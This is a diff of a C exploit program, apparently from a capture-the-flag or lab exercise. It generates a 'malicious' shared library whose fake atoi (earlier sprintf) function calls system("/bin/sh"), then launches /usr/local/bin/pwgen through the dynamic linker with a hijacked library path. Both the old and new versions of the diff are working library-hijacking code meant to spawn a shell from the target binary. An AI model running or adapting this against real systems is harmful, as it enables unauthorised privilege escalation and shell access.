@@ -4,27 +4,17 @@
 #include <string.h>
 
 int main() {
-    // const char *library_code = 
-    //     "#include <stdio.h>\n"
-    //     "#include <stdlib.h>\n"
-    //     "#include <unistd.h>\n"
-    //     "#include <string.h>\n"
-    //     "void my_init() __attribute__((constructor));\n"
-    //     "void my_init() {\n"
-    //     "    system(\"/bin/sh\");\n"
-    //     "}\n";
 
-    const char *library_code = 
-        "#include <stdio.h>\n"
-        "#include <stdlib.h>\n"
-        "#include <unistd.h>\n"
-        "#include <dlfcn.h>\n"
-        "#include <stdarg.h>\n"
-        "int sprintf(char *str, const char *format, ...) {\n"
-        "    system(\"/bin/sh\");\n"
-        "    return 1;\n"
-        "}\n";
-
+  const char *library_code =
+      "#define _GNU_SOURCE\n"
+      "#include <stdio.h>\n"
+      "#include <stdlib.h>\n"
+      "#include <unistd.h>\n"
+      "#include <dlfcn.h>\n"
+      "int atoi(const char *str) {\n"
+      "    system(\"/bin/sh\");\n"
+      "    return 1;\n"
+      "}\n";
     // Write the malicious code to a .c file
     FILE *file = fopen("malicious.c", "w");
     if (!file) {
@@ -41,25 +31,18 @@ int main() {
     }
 
     // Construct the LD_PRELOAD environment variable
-    char *ld_preload = realpath("malicious.so", NULL);
-    if (!ld_preload) {
-        perror("realpath");
-        return 1;
-    }
-    printf("Using LD_PRELOAD=%s\n", ld_preload);
+    const char *ld_path = "/lib64/ld-linux-x86-64.so.2";  // Path to the dynamic linker
+    const char *target = "/usr/local/bin/pwgen";  // Target binary
+    const char *lib_path = "./";  // Path where malicious.so is stored
 
-    // Set the LD_PRELOAD environment variable
-    if (setenv("LD_PRELOAD", ld_preload, 1) != 0) {
+    if (setenv("LD_LIBRARY_PATH", lib_path, 1) != 0) {
         perror("setenv");
         return 1;
     }
 
-    // Execute the target binary
-    const char *target = "./pwgen";  // Replace with the actual binary you want to target
-    execl(target, target, "-e=12345", NULL);
-
-    // Clean up
-    free(ld_preload);
+    execl(ld_path, ld_path, "--library-path", lib_path, target, NULL);
+    perror("execl failed");
 
     return 0;
 }
+
